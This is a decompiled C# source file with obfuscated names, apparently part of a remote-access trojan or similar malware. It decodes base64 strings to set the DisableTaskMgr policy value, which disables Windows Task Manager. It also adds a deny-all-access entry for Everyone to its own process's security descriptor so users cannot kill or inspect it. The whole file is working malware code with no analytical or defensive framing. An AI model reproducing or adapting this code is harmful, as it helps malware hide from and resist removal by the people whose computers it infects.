using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace kuMeqwHpurUBOD;

internal class TZgsKakdaVKQciq
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr coflvSByMftf, int WqCsJRzVrC, [Out] byte[] whsEeguvVgc, uint WUkwlZRDvoEI, out uint QuUBhsnIaasI);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr bVGYFEEazuajYOX, int YZxaVVdvdW, [In] byte[] UiPwgXBAGjR);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void gSbadMzFSeu(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			if (bool_0 && registryKey.GetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGlzYWJsZVRhc2tNZ3I=")) != null)
			{
				registryKey.DeleteValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGlzYWJsZVRhc2tNZ3I="));
			}
			else
			{
				registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RGlzYWJsZVRhc2tNZ3I="), "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor zPtuFMZCIHx(IntPtr intptr_0)
	{
		byte[] whsEeguvVgc = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, whsEeguvVgc, 0u, out var QuUBhsnIaasI);
		if ((long)QuUBhsnIaasI > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, whsEeguvVgc = new byte[QuUBhsnIaasI], QuUBhsnIaasI, out QuUBhsnIaasI))
		{
			return null;
		}
		return new RawSecurityDescriptor(whsEeguvVgc, 0);
	}

	private void jVViNYodPxcMsQd(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void UYThlCsjAz()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = zPtuFMZCIHx(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			jVViNYodPxcMsQd(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
